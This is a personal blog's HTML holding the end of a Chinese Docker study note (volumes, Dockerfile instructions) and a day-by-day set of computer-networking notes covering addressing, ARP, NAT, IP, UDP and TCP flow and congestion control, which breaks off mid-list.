<p><strong>卷技术</strong>：容器间数据共享技术！</p>
<ul>
<li>容器持久化和同步操作</li>
<li>容器间数据共享</li>
</ul>
<h4 id="使用数据卷（volume）"><a href="#使用数据卷（volume）" class="headerlink" title="使用数据卷（volume）"></a>使用数据卷（volume）</h4><blockquote>
<p>方式一： -v 	直接用命令挂载</p>
<p>指定路径挂载</p>
<p>-v 宿主机地址:容器地址</p>
<p>匿名挂载</p>
<p>-v 容器内路径</p>
<p>具名挂载</p>
<p>-v 卷名:容器内路径</p>
</blockquote>
<p>好处：只需在本地修改即可，容器内自动同步</p>
<p>扩展：设置权限</p>
<p>-v 容器内路径:ro&#x2F;rw</p>
<p>ro	readonly		这个路径只能由宿主机操作，容器内无法操作</p>
<p>rw	readwrite</p>
<blockquote>
<p>–volumes-from   实现数据共享</p>
<p>文件被删后也能实现数据共享，是要有使用该文件的存在就不会真正删除</p>
</blockquote>
<p><strong>结论</strong></p>
<ul>
<li>数据卷的生命周期一直持续到没有容器使用为止</li>
<li>一旦持久化到本地，本地的数据是不会删除的</li>
</ul>
<h2 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h2><h4 id="DockerFile-介绍"><a href="#DockerFile-介绍" class="headerlink" title="DockerFile 介绍"></a>DockerFile 介绍</h4><p>dockerfile 是用来构建docker镜像的文件！命令参数脚本！</p>
<h4 id="DockerFile构建过程"><a href="#DockerFile构建过程" class="headerlink" title="DockerFile构建过程"></a>DockerFile构建过程</h4><p><strong>基础知识：</strong></p>
<ol>
<li>每个保留关键字（指令）都必须是大写字母</li>
<li>执行从上到下顺序执行</li>
<li>&#x2F;# 表示注释</li>
<li>每一个指令都会创建一个新的镜像层，并提交</li>
</ol>
<p>dockerfile是面向开发的 </p>
<p>步骤：开发、部署、运行</p>
<p>DockerFile:构建文件，定义了一切的步骤，源代码</p>
<p>DockerImages:通过DockerFile构建生成的镜像，最终发布和运行的产品</p>
<p>Docker容器：容器就是镜像运行起来提供服务器</p>
<h4 id="DockerFile的指令"><a href="#DockerFile的指令" class="headerlink" title="DockerFile的指令"></a>DockerFile的指令</h4><p>FROM						# 基础镜像</p>
<p>MAINTAINER			# 镜像是谁写的，姓名+邮箱</p>
<p>RUN							# 镜像构建的时候需要运行的命令</p>
<p>ADD							# 步骤、tomcat镜像、这个tomcat压缩包！添加内容</p>
<p>WORKDIR					# 镜像的工作目录</p>
<p>VOLUME					# 挂载的目录</p>
<p>EXPOST						# 保留端口配置</p>
<p>CMD							# 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</p>
<p>ENTRYPOINT			# 指定这个容器启动的时候要运行的命令，可以追加命令</p>
<p>ONBUILD					# 当构建一个被继承DockerFile这个时候就会运行ONBUILD指令，触发指令</p>
<p>COPY						# 类似ADD，将我们的文件拷贝到镜像中</p>
<p>ENV							# 构建的时候设置环境变量</p>
<blockquote>
<p>scrach   		# 最基础的镜像</p>
<p>CMD [“ls”,”-a”]	运行CMD命令   当docker run 命令运行时在后面追加命令时会替换掉CMD原本的命令</p>
<p>ENTRYPOINT [“ls”,”-a”]	运行CMD命令   当docker run 命令运行时在后面追加命令时会在CMD原本的命令后面追加命令</p>
</blockquote>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="/2021/10/01/docker/work\note\docker\image-20210610125533543.png" alt="image-20210610125533543"></p>
<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1488757%2F201902%2F1488757-20190213230940998-2124455805.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1625892999&t=9dba81a3a32e90cda65d5d0b8d398902" alt="img"></p>
<h3 id="docker-网络"><a href="#docker-网络" class="headerlink" title="docker 网络"></a>docker 网络</h3><ul>
<li>容器之间可以互相ping 通</li>
<li>evth-pair 是一队的虚拟设备接口，成对出现、一段连接协议，一段彼此相连</li>
<li>evth-pair 充当桥梁，连接各种虚拟网络</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://monkeyh0ck.github.io/2021/10/01/docker/" data-id="clfpez93r0001fcv5ehm766hd" data-title="docker" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-network" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/network/" class="article-date">
  <time class="dt-published" datetime="2021-09-30T16:00:00.000Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/network/">计算机网络</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><p><img src="/2021/10/01/network/image-20211013154839748.png" alt="image-20211013154839748"></p>
<h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">通讯最终是根据MAC地址（网卡地址），输送数据到网卡，被网卡接收</span><br><span class="line">如果mac地址是自己，就会将数据传递给上一层进行处理</span><br><span class="line">如果mac地址不是自己，则会将数据丢弃</span><br><span class="line"></span><br><span class="line">不在同一网段无法直接ping通，需要路由器</span><br><span class="line">路由器负责连接不同网段</span><br><span class="line">ping使用ICMP协议</span><br><span class="line"></span><br><span class="line">用ARP协议(广播)获取mac地址</span><br><span class="line">广播只能在同一网段内传播</span><br><span class="line">广播目的是获取mac地址</span><br><span class="line">mac地址FFFF.FFFF.FFFF代表广播，同网段所有主机接收</span><br><span class="line">ARP协议有缓存</span><br><span class="line"></span><br><span class="line">半双工：同时只有一个源发信号</span><br><span class="line">全双工：都可以发信号</span><br></pre></td></tr></table></figure>

<p>计算机连接模式</p>
<ul>
<li>网线直连<ul>
<li>需要交叉线，不是直通线</li>
</ul>
</li>
<li>同轴电缆<ul>
<li>半双工通信</li>
<li>容易冲突</li>
<li>不安全</li>
<li>中间断了，整个瘫痪</li>
</ul>
</li>
<li>集线器（Hub）<ul>
<li>半双工通信</li>
<li>容易冲突</li>
<li>不安全</li>
<li>没智商，会将所有收到的数据转发给全部连接主机</li>
<li>一条线出问题，不影响其他线路</li>
<li>需要在同一网段</li>
</ul>
</li>
<li>网桥<ul>
<li>连接同一网段</li>
<li>通过自学习得知每个接口那侧的mac地址</li>
<li>起到隔绝冲突域的作用</li>
</ul>
</li>
<li>交换机<ul>
<li>相当于接口更多的网桥</li>
<li>全双工通信</li>
<li>记录每个接口的mac地址</li>
<li>比集线器安全</li>
<li>同一网段</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">全球都用交换机连接</span><br><span class="line">1.交换机连接同一网段，IP地址不够</span><br><span class="line">2.数据包太多（如：广播）</span><br></pre></td></tr></table></figure>

<h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><p><strong>网线直连、同轴电缆、集线器、网桥、交换机</strong></p>
<ul>
<li><p>同一网段</p>
</li>
<li><p>同一广播域</p>
</li>
</ul>
<p><strong>路由器</strong></p>
<ul>
<li>可以在不同网段之间转发数据</li>
<li>隔绝广播域</li>
</ul>
<hr>
<p>跨网段需要设置<strong>网关</strong>，路由器在该网段的IP地址</p>
<p>ping不同网段的主机</p>
<ol>
<li>源主机用ARP协议查找路由器mac地址</li>
<li>源主机将ICMP发送给路由器</li>
<li>路由器使用ARP协议查找目的地址的mac地址</li>
<li>路由器发送ICMP给目的主机</li>
<li>目的主机返回ICMP给源主机</li>
</ol>
<p><img src="/2021/10/01/network/image-20210928102822246.png" alt="image-20210928102822246"> </p>
<blockquote>
<p><strong>如果同一网段的两个主机中间用路由器连接，能否通信？</strong></p>
<p>不能通信</p>
<p>因为在同一网段，源主机想要ping目标主机就不需要经过路由器走网关，即直接发送ARP广播查找目的主机的mac地址，ARP广播会被路由器丢弃，不会发送给目的主机，即ARP协议广播发送后无响应，则无法实现通信。路由器两边的网段必须不一样。</p>
</blockquote>
<h3 id="mac地址"><a href="#mac地址" class="headerlink" title="mac地址"></a>mac地址</h3><p>每一个网卡都有一个6字节的mac地址</p>
<p>mac地址全球唯一，固化在了网卡的ROM中，由IEEE802标准规定</p>
<p>前三个字节：OUI，组织唯一标识符</p>
<p>后三个字节：网络接口标识符</p>
<p>mac地址可以自己设置</p>
<h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><p>IPv4（4字节）</p>
<p>IPv6（16字节）</p>
<p>IP地址&#x3D;网络ID+主机ID</p>
<p>主机ID全0：主机所在网段</p>
<p>主机ID全1：主机所在网段的全部主机（广播）</p>
<ul>
<li>A类地址</li>
</ul>
<p><img src="/2021/10/01/network/image-20210928133659174.png" alt="image-20210928133659174"> </p>
<blockquote>
<p>网络ID不能是全0</p>
</blockquote>
<ul>
<li>B类地址</li>
</ul>
<p><img src="/2021/10/01/network/image-20210928134113841.png" alt="image-20210928134113841"> </p>
<ul>
<li>C类地址</li>
</ul>
<p><img src="/2021/10/01/network/image-20210928134434095.png" alt="image-20210928134434095"> </p>
<ul>
<li>D类地址、E类地址</li>
</ul>
<p><img src="/2021/10/01/network/image-20210928134610633.png" alt="image-20210928134610633"> </p>
<h3 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h3><p>子网划分：借用主机位作为子网位，划分出多个子网</p>
<ul>
<li>等长子网划分</li>
<li>变长子网划分</li>
</ul>
<blockquote>
<p>判断网络地址类型，不看子网掩码，看地址开头</p>
</blockquote>
<h2 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h2><p><img src="/2021/10/01/network/image-20210929104717574.png" alt="image-20210929104717574"> </p>
<blockquote>
<p><strong>无法正常通信</strong></p>
<p>发送数据时，只知道目标主机的ip，不知道子网掩码，所以通过将目标主机的IP地址与自己的子网掩码做与运算，判断是否与自己在同一网段</p>
<p>计算机1的网络ID为192.168.0.0，他用自己的子网掩码计算计算机0的网络ID为192.168.0.0，在同一网段，可以通信。但是计算机0用自己的子网掩码计算发现，计算机1和自己不在同一网段，所以计算机0无法给计算机1发送数据。</p>
</blockquote>
<h3 id="超网"><a href="#超网" class="headerlink" title="超网"></a>超网</h3><p>与子网相反，将多个连续网段合并成一个更大的网段</p>
<h3 id="如何判断子网和超网"><a href="#如何判断子网和超网" class="headerlink" title="如何判断子网和超网"></a>如何判断子网和超网</h3><ol>
<li>看网段类型</li>
<li>比较子网掩码和默认子网掩码的位数多少</li>
<li>位数多-子网，位数少-超网</li>
</ol>
<h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>默认情况下，路由器只知道跟他直连的网段，非直连的网段需要通过静态路由，动态路由告诉他</p>
<ul>
<li>静态路由<ul>
<li>管理员手动添加</li>
</ul>
</li>
<li>动态路由<ul>
<li>路由选择协议（RIP，OSPF）</li>
</ul>
</li>
</ul>
<h2 id="第五天"><a href="#第五天" class="headerlink" title="第五天"></a>第五天</h2><h4 id="数据包的传输过程"><a href="#数据包的传输过程" class="headerlink" title="数据包的传输过程"></a>数据包的传输过程</h4><p><img src="/2021/10/01/network/%E6%88%AA%E5%B1%8F2021-10-01%20%E4%B8%8A%E5%8D%888.14.53.png" alt="截屏2021-10-01 上午8.14.53"> </p>
<p>源IP和目标IP不变，mac地址改变</p>
<h4 id="网络、互联网、因特网"><a href="#网络、互联网、因特网" class="headerlink" title="网络、互联网、因特网"></a>网络、互联网、因特网</h4><p>全球最大的互联网：因特网</p>
<p>网络：同一网段的连接</p>
<p>互联网：不同网段连接在一起</p>
<h4 id="网络分类"><a href="#网络分类" class="headerlink" title="网络分类"></a>网络分类</h4><p><img src="/2021/10/01/network/image-20211001082722312.png" alt="image-20211001082722312"> </p>
<h4 id="网口"><a href="#网口" class="headerlink" title="网口"></a>网口</h4><ul>
<li><p>以太网口（FastEthernet）</p>
<ul>
<li>百兆</li>
<li>GigabitEthernet    千兆</li>
</ul>
</li>
<li><p>串口</p>
</li>
</ul>
<h4 id="上网方式"><a href="#上网方式" class="headerlink" title="上网方式"></a>上网方式</h4><ul>
<li>电话线入户</li>
<li>光线入户</li>
<li>网线入户</li>
</ul>
<h4 id="公网IP、私网IP"><a href="#公网IP、私网IP" class="headerlink" title="公网IP、私网IP"></a>公网IP、私网IP</h4><p>公网IP：</p>
<ul>
<li>Internet上的路由器只有到达公网的路由表，没有到达私网的路由表</li>
<li>公网IP统一分配</li>
</ul>
<p>私网IP</p>
<ul>
<li>A类：10.0.0.0&#x2F;8</li>
<li>B类：172.</li>
<li>C类：192.168.0.0-192.168.255.0</li>
</ul>
<h4 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h4><p>私网IP访问公网IP时，将私网IP地址换为公网IP地址</p>
<blockquote>
<p>可能会多次NAT转换</p>
</blockquote>
<p>特点</p>
<ul>
<li>节约公网IP</li>
</ul>
<p>分类</p>
<ul>
<li>静态转换</li>
<li>动态转换</li>
<li>PAT</li>
</ul>
<h2 id="第六天"><a href="#第六天" class="headerlink" title="第六天"></a>第六天</h2><h4 id="ping的第一次不通的原因"><a href="#ping的第一次不通的原因" class="headerlink" title="ping的第一次不通的原因"></a>ping的第一次不通的原因</h4><p>第一次ping不知道mac地址，且在不同的网段，中间需要经过路由器。</p>
<p>ICMP发送到路由器后，路由器也不知道对应IP主机的mac地址，路由器需要发送ARP广播，查询IP主机的mac地址，路由器由于忙不过来，会将ICMP数据包丢掉，即第一次ICMP无法抵达。</p>
<h4 id="网络互联模型"><a href="#网络互联模型" class="headerlink" title="网络互联模型"></a>网络互联模型</h4><p><img src="/2021/10/01/network/image-20211006132547117.png" alt="image-20211006132547117"> </p>
<p><img src="/2021/10/01/network/image-20211006133104202.png" alt="image-20211006133104202"> </p>
<p><img src="/2021/10/01/network/image-20211006133318561.png" alt="image-20211006133318561"></p>
<h4 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h4><ul>
<li>模拟信号<ul>
<li>连续信号</li>
<li>适合长距离传输</li>
<li>抗干扰差</li>
</ul>
</li>
<li>数字信号<ul>
<li>不连续信号</li>
<li>不适合长距离传输</li>
<li>抗干扰强</li>
</ul>
</li>
</ul>
<p>信道：信息传输的通道</p>
<ul>
<li>单工通信</li>
<li>半双工通信</li>
<li>全双工通信</li>
</ul>
<h4 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h4><p>链路：从一个节点到相邻节点的一段物理线路，没有中间节点</p>
<p>数据链路：在一条链路上传输数据时，需要有通信协议控制数据的传输</p>
<ul>
<li>广播通信：CSMA&#x2F;CD协议（集线器，以太网帧）<ul>
<li>为检测冲突，以太网帧至少有64位</li>
<li>以太网帧64-1518</li>
</ul>
</li>
<li>点对点通信：PPP协议（PPP帧）</li>
</ul>
<blockquote>
<p>PPP帧和以太网帧的网络层数据相同</p>
</blockquote>
<p><strong>三个基本问题</strong></p>
<ul>
<li>封装成帧</li>
<li>透明传输</li>
<li>差错检验</li>
</ul>
<p><strong>封装成帧</strong></p>
<ul>
<li>帧：数据部分</li>
<li>MTU：最大传输单元</li>
</ul>
<p><strong>透明传输</strong></p>
<p><img src="/2021/10/01/network/image-20211006135540183.png" alt="image-20211006135540183"> </p>
<p><strong>差错检验</strong></p>
<p>FCS：数据部分和首部经过计算得出，收到帧后，将数据部分和首部进行计算发现与FCS不同则丢弃帧</p>
<p><strong>CSMA&#x2F;CD</strong></p>
<p><img src="/2021/10/01/network/image-20211006142853130.png" alt="image-20211006142853130"> </p>
<p><strong>PPP协议</strong></p>
<p><img src="/2021/10/01/network/image-20211006142800861.png" alt="image-20211006142800861"> </p>
<p><strong>网卡</strong></p>
<p><img src="/2021/10/01/network/image-20211006143733554.png" alt="image-20211006143733554"> </p>
<p>网卡工作在物理层、数据链路层</p>
<p>交换机工作在物理层、数据链路层</p>
<p>集线器工作在物理层</p>
<p>路由器工作在物理层、数据链路层、网络层</p>
<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><p>网络层数据包（IP数据包）由首部和数据组成</p>
<p>数据很多时候是由传输层传递下来的数据段</p>
<p><img src="/2021/10/01/network/image-20211006145005092.png" alt="image-20211006145005092"> </p>
<p>首部长度有四位，首部长度最长60字节，首部固定部分20个字节，可变部分40字节</p>
<h2 id="第七天"><a href="#第七天" class="headerlink" title="第七天"></a>第七天</h2><ul>
<li>版本<ul>
<li>占4位</li>
<li>IPv4</li>
<li>IPv6</li>
</ul>
</li>
<li>总部长度<ul>
<li>占4位</li>
<li>最小：0b0101：20</li>
<li>最大：0b1111：60</li>
</ul>
</li>
<li>区分服务<ul>
<li>占8位</li>
<li>提升网络服务质量<ul>
<li>将特定标记的数据包优先放行</li>
</ul>
</li>
</ul>
</li>
<li>总长度<ul>
<li>占16位</li>
<li>首部+数据长度之和最大值65535</li>
<li>帧的数据不能超过1500字节，每片数据部分最大长度1460</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211007110854361.png" alt="image-20211007110854361"> </p>
<ul>
<li>标识<ul>
<li>占16位</li>
<li>数据包的ID，当数据包过大进行分片时，同一个数据包的所有片的标识都是一样的</li>
<li>有一个计数器专门管理数据包的ID，每发出一个数据包，ID就加1</li>
</ul>
</li>
<li>标志<ul>
<li>占3位</li>
<li>第1位（Reserved Bit）：保留</li>
<li>第2位（Don’t Fragment）：1代表不允许分片，0代表允许分片 </li>
<li>第3位（More Fragments）：1代表不是最后一片，0代表是最后一片</li>
</ul>
</li>
<li>位偏移<ul>
<li>占13位</li>
<li>片偏移乘以8：字节偏移 </li>
<li>每一片的长度一定是8的整数倍</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211007111056369.png" alt="image-20211007111056369"> </p>
<p><img src="/2021/10/01/network/image-20211007114657538.png" alt="image-20211007114657538"> </p>
<ul>
<li>生存时间<ul>
<li>占8位</li>
<li>每个路由器转发前会将TTL减1，一旦TTL为0，路由器会返回错误报告</li>
<li>观察使用ping命令后的TTL，能够推测出对方的操作系统、中间经过了多少个路由器</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211007134337250.png" alt="image-20211007134337250"> </p>
<ul>
<li>协议<ul>
<li>占8位</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211007134519107.png" alt="image-20211007134519107"> </p>
<hr>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p><img src="/2021/10/01/network/image-20211007135420459.png" alt="image-20211007135420459"> </p>
<h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><p>数据格式</p>
<ul>
<li>无连接，减少建立和释放连接的开销</li>
<li>尽可能交付，不保证可靠交付</li>
<li>首部只有8个字节</li>
<li>UDP长度，占16位，首部的长度+数据的长度</li>
</ul>
<p><img src="/2021/10/01/network/image-20211007141244762.png" alt="image-20211007141244762"> </p>
<ul>
<li>校验和<ul>
<li>检验和的计算内容：伪首部 + 首部 + 数据 </li>
<li>伪首部：仅在计算检验和时起作用，并不会传递给网络层</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211007141423436.png" alt="image-20211007141423436"> </p>
<ul>
<li>端口<ul>
<li>UDP首部端口占2字节</li>
<li>客户端的源端口是临时开启的随机端口</li>
</ul>
</li>
<li>常见命令<ul>
<li>netstat -an：查看被占用的端口</li>
<li>netstat -anb：查看被占用的端口、占用端口的应用程序</li>
<li>telnet 主机 端口：查看是否可以访问主机的某端口</li>
</ul>
</li>
</ul>
<h2 id="第八天"><a href="#第八天" class="headerlink" title="第八天"></a>第八天</h2><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p><img src="/2021/10/01/network/image-20211008152914381.png" alt="image-20211008152914381"></p>
<ul>
<li>数据偏移<ul>
<li>占4位</li>
<li>乘以 4&#x3D;首部长度</li>
<li>首部长度为20-60字节</li>
</ul>
</li>
<li>保留<ul>
<li>占6位，目前全为0</li>
</ul>
</li>
</ul>
<blockquote>
<p>有些资料：保留位3位；标志位9位。</p>
<p>由于9位标志位情况下，前3位不使用，依旧为0，所以无区别。</p>
<p>wireshark同上。</p>
</blockquote>
<hr>
<p><strong>TCP的一个细节</strong></p>
<p><strong>UDP</strong>首部有<strong>16</strong>位记录UDP报文段的长度（首部+数据）</p>
<p><strong>TCP</strong>首部只有<strong>4</strong>位记录TCP报文长度，没记录数据长度</p>
<p><strong>分析</strong></p>
<p>UDP首部16位长度字段是冗余的，纯粹为保证首部是32bit对齐</p>
<p>TCP&#x2F;UDP的数据长度，完全可以由IP数据包的首部推测出来</p>
<ul>
<li>传输层的数据长度 &#x3D; 网络层的总长度 – 网络层的首部长度 –传输层的首部长度</li>
</ul>
<hr>
<ul>
<li>校验和<ul>
<li>伪首部：占用 12 字节，仅在计算检验和时起作用并不会传递给网络层</li>
<li>跟UDP 一样，TCP检验和的计算内容：伪首部 + 首部 + 数据</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211008160415040.png" alt="image-20211008160415040"></p>
<ul>
<li>标志位<ul>
<li>URG<ul>
<li>当URG为1时，紧急指针字段才有效。表明当前报文中数据应优先尽快传送</li>
</ul>
</li>
<li>ACK（Acknowledgment ）</li>
<li>当ACK&#x3D;1 时，确认号字段才有效</li>
<li>PSH （Push ）</li>
<li>RST （ResetReset）<ul>
<li>当RST&#x3D;1 时，表明连接中出现严重差错必须释放然后再新建立连接</li>
</ul>
</li>
</ul>
</li>
<li>序号<ul>
<li>占4位</li>
<li>首先，在传输过程的每一个字节都会有编号</li>
<li>在建立连接后，序号代表：这一次传给对方的 TCP 数据部分的第一个字节编号</li>
<li>从1开始</li>
</ul>
</li>
<li>确认号（ Acknowledgment Number Number）<ul>
<li>占4字节</li>
<li>在建立连接后，确认号代表：期望对方下一次传过来的 TCP 数据部分的第一个字节编号</li>
</ul>
</li>
<li>窗口（ Window ）<ul>
<li>占2字节</li>
<li>这个字段有流量控制功能，用以告知对方下一次允许发送的数据大小（字节为单位）</li>
</ul>
</li>
</ul>
<p><strong>tcp的几个要点</strong></p>
<ul>
<li>可靠传输</li>
<li>流量传输</li>
<li>拥塞控制</li>
<li>连接管理<ul>
<li>建立连接</li>
<li>释放连接</li>
</ul>
</li>
</ul>
<hr>
<h4 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h4><ul>
<li>ARQ自动重传请求<ul>
<li>停止等待ARQ协议</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211008200142051.png" alt="image-20211008200142051"></p>
<p><img src="/2021/10/01/network/image-20211008200542529.png" alt="image-20211008200542529"></p>
<ul>
<li>连续ARQ协议+活动窗口协议</li>
</ul>
<p><img src="/2021/10/01/network/image-20211008201111069.png" alt="image-20211008201111069"></p>
<p>ACK返回期待的下一个序号，该序号之前的数据都已经收到</p>
<ul>
<li>SACK（选择性确认）<ul>
<li>在无选择性确认的情况下：TCP会重传最后确认分组后续的分组们<ul>
<li>例如：发送1.2.3.4.5，丢失3，则会重传3.4.5</li>
</ul>
</li>
<li>在选择性确认的情况下：TCP只会重传最后确认的分组<ul>
<li>例如：发送1.2.3.4.5，丢失3，则只会重传3</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211008204018654.png" alt="image-20211008204018654"></p>
<p>左边界会记录已经收到的数据块的起始字节</p>
<p>右边界会记录下一个未收到数据块的起始字节</p>
<p><img src="/2021/10/01/network/TCP01_%E5%BA%8F%E5%8F%B7_%E7%A1%AE%E8%AE%A4%E5%8F%B7.png" alt="TCP01_序号_确认号"></p>
<p>序号的数字，记录这个数据包的第几个字节大多是经过计算</p>
<p>初始序号来自SYN建立连接时发送的真实序号</p>
<p>其他序号由收到的真实序号减去SYN建立连接时的真实序号</p>
<blockquote>
<p>传输层就会将数据分为多个TCP，将数据大卸八块。</p>
</blockquote>
<h2 id="第九天"><a href="#第九天" class="headerlink" title="第九天"></a>第九天</h2><blockquote>
<p><strong>如果一个包多次重传失败，会如何？</strong></p>
<p>根据系统设置，重传规定次数后还是重传失败则会发送reset报文，断开TCP连接</p>
<p><strong>如果发送到的数据不足接收窗口大小，如何确定有没有后续包？</strong></p>
<p>等待一定时间后，没有收到后续包，则会返回确认到已经收到的包</p>
<p><strong>为什么数据会在传输层进行切割，分成小块传递给网络层？</strong></p>
<p>传输层有重传功能（如TCP），网络层、数据链路层、物理层没有重传功能。</p>
<p>如果传输层没有将数据进行切割，则大块的数据会传递给网络层，进行拆分。</p>
<p>正常传输，没有问题。一旦发生丢包现象，网络层收到数据，传递给传输层，由于传输层没有将数据包进行切割，故传输层收到的数据包不完整，没法判断那个包传输失败，则不会返回ACK，长时间没有收到ACK则另一边会重传所有数据，造成大量浪费。</p>
<p>如果在传输层不分段，一旦出现数据丢失整个的都得重</p>
<p>如果在传输层分了段，一旦出现数据丢失只需要重的那些即可</p>
</blockquote>
<h4 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h4><p><strong>原理</strong></p>
<ul>
<li>通过确认报文中窗口字段来控制发送方的速率</li>
<li>发送方的窗口大小不能超过接收给出</li>
<li>当发送方收到接窗口的大小为 0时，发送方就会停止数据</li>
</ul>
<p><img src="/2021/10/01/network/TCP02_%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6.png" alt="TCP02_流量控制"></p>
<hr>
<p><strong>有一种特殊情况</strong></p>
<ul>
<li>一开始,接收方给发送方发送了0窗口的报文段</li>
<li>后面,接收方又有了一些存储空间,给发送方发送的非0窗口的报文段丢失了</li>
<li>发送方的发送窗口一直为零,双方陷入僵局</li>
</ul>
<p><strong>解决方案</strong></p>
<ul>
<li>当发送方收到0窗口通知时,这时发送方停止发送报文</li>
<li>并且同时开启一个定时器,隔一段时间就发个测试报文去询问接收方最新的窗口大小</li>
<li>如果接收的窗口大小还是为0,则发送方再次刷新启动定时器</li>
</ul>
<hr>
<h4 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h4><ul>
<li>防止过多的数据注入到网络中</li>
<li>避免网络中的路由器或链路过载</li>
<li>拥塞控制是一个全局性的过程<ul>
<li>涉及到所有的主机、路由器</li>
<li>以及与降低网络传输性能有关的所有因素</li>
<li>是大家共同努力的结果</li>
</ul>
</li>
<li>相比而言,流量控制是点对点通信的控制</li>
</ul>
<hr>
<p>控制方法</p>
<ul>
<li>慢启动</li>
<li>拥塞避免</li>
<li>快速启动</li>
<li>快速恢复</li>
</ul>
<hr>
<blockquote>
<ul>
<li><p>MMS（Maximum Segment Size Size）：每段最大的数据部分大小</p>
<ul>
<li>在建立连接时确认，SYN数据段首部的选项中会规定MMS，TCP通信双方取最小的MMS。</li>
<li>MMS大小随机，不一定都是1460（最大）</li>
</ul>
</li>
<li><p>cwnd( congestion window):拥塞窗口</p>
</li>
<li><p>rwnd( receive window):接收窗口</p>
</li>
<li><p>swnd( send window):发送窗口</p>
<ul>
<li>swnd min(cwnd, rwnd)</li>
</ul>
</li>
</ul>
</blockquote>
<h5 id="慢开始"><a href="#慢开始" class="headerlink" title="慢开始"></a>慢开始</h5><p>指数增长，发送的数据包都被正常接收，则拥塞窗口翻倍</p>
<p><img src="/2021/10/01/network/image-20211009155603835.png" alt="image-20211009155603835"></p>
<h5 id="拥塞避免"><a href="#拥塞避免" class="headerlink" title="拥塞避免"></a>拥塞避免</h5><ul>
<li>ssthresh（slow start threshold threshold）：慢开始阈值， cwnd 达到阈值后，以线性方式增加</li>
<li>拥塞避免（加法增大）：窗口缓慢，以防止网络过早出现</li>
<li>乘法减小：只要网络出现拥塞，把 ssthresh 减为拥塞峰值的一半，同时执行慢开始算法（ cwnd 又恢复到初始值）</li>
<li>当网络出现频繁拥塞时， ssthresh</li>
</ul>
<p><img src="/2021/10/01/network/image-20211009160052789.png" alt="image-20211009160052789"></p>
<h5 id="快重传"><a href="#快重传" class="headerlink" title="快重传"></a>快重传</h5><ul>
<li>接收方<ul>
<li>每收到一个失序的分组后就立即发出重复确认</li>
<li>使发送方及时知道有分组没到达</li>
<li>而不要等待自己发送数据时才进行确认</li>
</ul>
</li>
<li>发送方<ul>
<li>只要连续收到三个重复确认（总共 4个相同的确认），就应当立即重传对方尚未收到报文段</li>
<li>而不必继续等待重传计时器到期后再重传</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211009161452792.png" alt="image-20211009161452792"></p>
<h5 id="快恢复"><a href="#快恢复" class="headerlink" title="快恢复"></a>快恢复</h5><ul>
<li>当发送方连续收到三个重复确认，说明网络出现拥塞<ul>
<li>就执行“乘法减小”算，把 ssthresh 减为拥塞峰值的一半</li>
</ul>
</li>
<li>与慢开始不同之处是现在执行算法，即 cwnd 现在不恢复到初始值<ul>
